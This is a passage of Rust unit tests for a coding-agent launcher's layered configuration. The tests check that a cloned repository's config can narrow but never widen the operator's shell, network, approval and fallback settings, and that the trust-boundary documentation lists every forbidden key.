    /// actually setting anything (see the file's own header for why an
    /// *active* default-valued key would be a real bug: the repo layer
    /// merges on top of the operator's own global `~/.zirv/ctx.toml` in
    /// `CtxConfig::load`, so an active key here would silently clobber a
    /// real customization of the same key).
    ///
    /// Two things are pinned:
    /// (a) the file still parses cleanly through the real repo-layer path,
    ///     and `chat.model = "fable"` -- a real, previously-committed
    ///     operator decision (see the file's own comment) and the one key
    ///     that is deliberately NOT `REPO_FORBIDDEN`, see `ChatConfig`'s doc
    ///     comment -- is the ONLY active, non-default value it produces;
    /// (b) every key in `ALL_CONFIG_KEYS` still appears in the file text,
    ///     active or commented, so the reference stays exhaustive as
    ///     config.rs grows: this must fail only when a key is missing from
    ///     the file entirely, never when someone edits a value.
    #[test]
    fn the_repo_ctx_toml_parses_and_stays_exhaustive() {
        let repo = Path::new(env!("CARGO_MANIFEST_DIR"));
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo, &|k| empty.get(k).cloned())
            .expect("the repo's own .zirv/ctx.toml must parse cleanly");

        let expected = CtxConfig {
            agents: cfg.agents.clone(),
            chat: ChatConfig {
                model: Some("fable".to_string()),
            },
            ..CtxConfig::default()
        };
        assert_eq!(
            cfg, expected,
            "chat.model must be the only active, non-default key in .zirv/ctx.toml"
        );

        let path = repo
            .join(crate::utils::SCRIPT_DIR_NAME)
            .join(CTX_CONFIG_FILE);
        let text = std::fs::read_to_string(&path).expect("read .zirv/ctx.toml");
        for (table, key) in ALL_CONFIG_KEYS {
            let section = table_section(&text, table);
            assert!(
                section_has_key(&section, key),
                "{}: key `{key}` missing from table `[{table}]` (active or commented)",
                path.display()
            );
        }
    }

    /// Companion to the exhaustiveness test above, guarding the *other*
    /// direction: every entry in `REPO_FORBIDDEN` must have its own row in
    /// both hand-maintained trust-boundary tables (README.md, and
    /// `docs/obsidian/Concepts/Untrusted Configuration.md`). A repo-forbidden
    /// key with no doc row is invisible to anyone reading either table to
    /// find out what's blocked and why. This drift already happened once
    /// (Task 1's round 1 review caught `memory.shared_enabled` missing from
    /// both tables); this test exists so a NEW `REPO_FORBIDDEN` entry can
    /// never repeat it silently. Only presence is checked, not wording: each
    /// table's own prose explains the rationale in its own voice.
    ///
    /// The needle is anchored to the actual table-row shape
    /// (`` | `key` ``, a markdown table cell), not a bare backtick-wrapped
    /// mention anywhere in the file: a prose sentence merely naming the key
    /// (as this file's own trust-boundary intro paragraphs do) must not
    /// count as "documented in the table" -- a fix-round review caught this
    /// weaker check passing on prose alone.
    #[test]
    fn every_repo_forbidden_key_has_a_row_in_both_trust_boundary_tables() {
        let repo = Path::new(env!("CARGO_MANIFEST_DIR"));
        let readme = std::fs::read_to_string(repo.join("README.md")).expect("read README.md");
        let untrusted_config = std::fs::read_to_string(
            repo.join("docs")
                .join("obsidian")
                .join("Concepts")
                .join("Untrusted Configuration.md"),
        )
        .expect("read Untrusted Configuration.md");

        for (path, _env_var) in REPO_FORBIDDEN {
            let canonical = path.join(".");
            let needle = format!("| `{canonical}`");
            assert!(
                readme.contains(&needle),
                "README.md's trust-boundary table is missing a row for `{canonical}`"
            );
            assert!(
                untrusted_config.contains(&needle),
                "Untrusted Configuration.md's forbidden-key table is missing a row for `{canonical}`"
            );
        }
    }

    /// Companion to the test above: `.zirv/.settings.toml` parses cleanly
    /// through the real settings loader. Every line in it is commented out
    /// (sample-config style, same as ctx.toml), so both known agents stay
    /// enabled at their default.
    #[test]
    fn the_repo_own_settings_toml_parses_without_error() {
        let repo = Path::new(env!("CARGO_MANIFEST_DIR"));
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty: HashMap<String, String> = HashMap::new();
        let gate = crate::settings::AgentGate::load(repo, &|k| empty.get(k).cloned())
            .expect("the repo's own .zirv/.settings.toml must parse cleanly");

        assert!(gate.is_enabled("claude"));
        assert!(gate.is_enabled("codex"));
    }

    #[test]
    fn a_config_with_no_policy_table_declares_no_restriction() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy, super::super::policy::EffectivePolicy::default());
    }

    #[test]
    fn the_operator_may_set_policy_stances_from_home_config_and_env() {
        use super::super::policy::Stance;

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"ask\"\nnetwork = \"deny\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.shell_exec, Stance::Ask);
        assert_eq!(cfg.policy.network, Some(Stance::Deny));
        assert_eq!(cfg.policy.repo_fs_write, Stance::Allow);

        let env = env_map(&[("ZIRV_CTX_POLICY_SHELL_EXEC", "deny")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.shell_exec, Stance::Deny);
        assert_eq!(
            cfg.policy.network,
            Some(Stance::Deny),
            "the home layer still applies under the env layer"
        );
    }

    /// SECURITY: the cloned-repository privilege-widening case, end to end
    /// through `CtxConfig::load` rather than through `policy::resolve` alone.
    /// `[policy]` is the one table a repo checkout may write to at all, so the
    /// clamp is what stands in for a `REPO_FORBIDDEN` entry here -- see the
    /// `policy` field's own doc comment.
    #[test]
    fn a_repo_policy_table_cannot_widen_the_operators_own_stances() {
        use super::super::policy::Stance;

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"deny\"\nnetwork = \"deny\"\napproval = \"ask\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"allow\"\nnetwork = \"ask\"\napproval = \"allow\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.shell_exec, Stance::Deny);
        assert_eq!(cfg.policy.network, Some(Stance::Deny));
        assert_eq!(cfg.policy.approval, Stance::Ask);
    }

    /// Bug B, end to end: the same cloned-repository widening attempt as
    /// `a_repo_policy_table_cannot_widen_the_operators_own_stances` above, but
    /// followed all the way to the argv `AgentAdapter::policy_args` actually
    /// builds from the resolved (narrow-only) `cfg.policy` -- for *both*
    /// registered adapters, from the *same* resolved config. A repo checkout
    /// must never be able to raise its own approval level on either harness,
    /// and one operator `[policy]` setting must produce a real, non-empty
    /// restriction on both, not just on the one this test happens to check
    /// first.
    #[test]
    fn a_repo_cannot_widen_its_way_to_a_permissive_launch_on_either_adapter() {
        use super::super::adapters::{
            AgentAdapter, LaunchMode, claude::ClaudeAdapter, codex::CodexAdapter,
        };

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"deny\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"allow\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");

        let claude = ClaudeAdapter::new(None);
        let claude_args = claude.policy_args(&cfg.policy, LaunchMode::Interactive);
        assert_eq!(
            claude_args,
            claude.read_only_args(),
            "the repo's own 'allow' must not reach claude's launch argv: {claude_args:?}"
        );

        let codex = CodexAdapter::new(None);
        let codex_args = codex.policy_args(&cfg.policy, LaunchMode::Interactive);
        assert!(
            codex_args.contains(&"--sandbox".to_string())
                && codex_args.contains(&"read-only".to_string())
                && codex_args.contains(&"--ask-for-approval".to_string())
                && codex_args.contains(&"never".to_string()),
            "the repo's own 'allow' must not reach codex's launch argv either: {codex_args:?}"
        );
    }

    /// The other direction: narrowing from a checkout is honored, because a
    /// stricter stance can never be a privilege escalation.
    #[test]
    fn a_repo_policy_table_may_narrow_a_stance_the_operator_left_loose() {
        use super::super::policy::Stance;

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\ngit_push_destructive = \"deny\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.git_push_destructive, Stance::Deny);
    }

    /// The operator's escape hatch above the fold: a repo that narrowed a
    /// stance the operator needs loose is overridable by environment, exactly
    /// like `ZIRV_AGENT_<NAME>_ENABLED` re-enables a repo-disabled agent.
    #[test]
    fn the_environment_can_loosen_a_stance_a_repo_narrowed() {
        use super::super::policy::Stance;

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"deny\"\n",
        )
        .expect("write");

        let env = env_map(&[("ZIRV_CTX_POLICY_SHELL_EXEC", "allow")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.shell_exec, Stance::Allow);
    }

    /// A malformed `[policy]` table fails the load loudly rather than
    /// defaulting the whole section to `allow` -- the same "loud rather than
    /// silent" rule `reject_untrusted_keys` follows, applied to a section
    /// where a silent default is a permission grant.
    #[test]
    fn fallback_defaults_are_conservative_and_enabled() {
        let cfg = FallbackConfig::default();
        assert!(cfg.enabled);
        assert_eq!(cfg.order, vec!["claude", "codex"]);
        assert_eq!(cfg.predictive_headroom_pct, 20.0);
        assert_eq!(cfg.min_candidate_headroom_pct, 10.0);
        assert_eq!(cfg.unknown_headroom_pct, 25.0);
        assert_eq!(cfg.small_task_max_tokens, 40_000);
        assert_eq!(cfg.small_task_max_tool_calls, 24);
    }

    #[test]
    fn a_repo_fallback_table_can_only_narrow_the_operator_policy() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[fallback]\nenabled = true\norder = [\"claude\", \"codex\"]\npredictive_headroom_pct = 15.0\nmin_candidate_headroom_pct = 20.0\nunknown_headroom_pct = 20.0\nsmall_task_max_tokens = 30000\nsmall_task_max_tool_calls = 20\n",
        )
        .expect("write home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        // Every value below except order attempts to make fallback MORE eager.
        // Order also tries to reorder and add a candidate outside the home
        // preference. None of those widenings may survive the trust fold.
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback]\nenabled = true\norder = [\"codex\", \"claude\"]\npredictive_headroom_pct = 80.0\nmin_candidate_headroom_pct = 1.0\nunknown_headroom_pct = 90.0\nsmall_task_max_tokens = 90000\nsmall_task_max_tool_calls = 90\n",
        )
        .expect("write repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(cfg.fallback.enabled);
        assert_eq!(cfg.fallback.order, vec!["claude", "codex"]);
        assert_eq!(cfg.fallback.predictive_headroom_pct, 15.0);
        assert_eq!(cfg.fallback.min_candidate_headroom_pct, 20.0);
        assert_eq!(cfg.fallback.unknown_headroom_pct, 20.0);
        assert_eq!(cfg.fallback.small_task_max_tokens, 30_000);
        assert_eq!(cfg.fallback.small_task_max_tool_calls, 20);
    }

    #[test]
    fn a_repo_may_disable_filter_and_tighten_fallback() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[fallback]\norder = [\"claude\", \"codex\"]\npredictive_headroom_pct = 20.0\nmin_candidate_headroom_pct = 10.0\nunknown_headroom_pct = 25.0\nsmall_task_max_tokens = 40000\nsmall_task_max_tool_calls = 24\n",
        )
        .expect("write home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback]\nenabled = false\norder = [\"codex\"]\npredictive_headroom_pct = 10.0\nmin_candidate_headroom_pct = 30.0\nunknown_headroom_pct = 5.0\nsmall_task_max_tokens = 8000\nsmall_task_max_tool_calls = 6\n",
        )
        .expect("write repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.fallback.enabled);
        assert_eq!(cfg.fallback.order, vec!["codex"]);
        assert_eq!(cfg.fallback.predictive_headroom_pct, 10.0);
        assert_eq!(cfg.fallback.min_candidate_headroom_pct, 30.0);
        assert_eq!(cfg.fallback.unknown_headroom_pct, 5.0);
        assert_eq!(cfg.fallback.small_task_max_tokens, 8_000);
        assert_eq!(cfg.fallback.small_task_max_tool_calls, 6);
    }

    #[test]
    fn fallback_env_is_the_operator_override_above_repo_narrowing() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback]\nenabled = false\norder = []\nunknown_headroom_pct = 0.0\n",
        )
        .expect("write repo");

        let env = env_map(&[
            ("ZIRV_CTX_FALLBACK", "true"),
            ("ZIRV_CTX_FALLBACK_ORDER", "codex,claude"),
            ("ZIRV_CTX_FALLBACK_UNKNOWN_HEADROOM_PCT", "35"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(cfg.fallback.enabled);
        assert_eq!(cfg.fallback.order, vec!["codex", "claude"]);
        assert_eq!(cfg.fallback.unknown_headroom_pct, 35.0);
    }

    #[test]
    fn a_malformed_repo_policy_table_fails_the_load() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"nope\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        assert!(CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).is_err());
    }
}
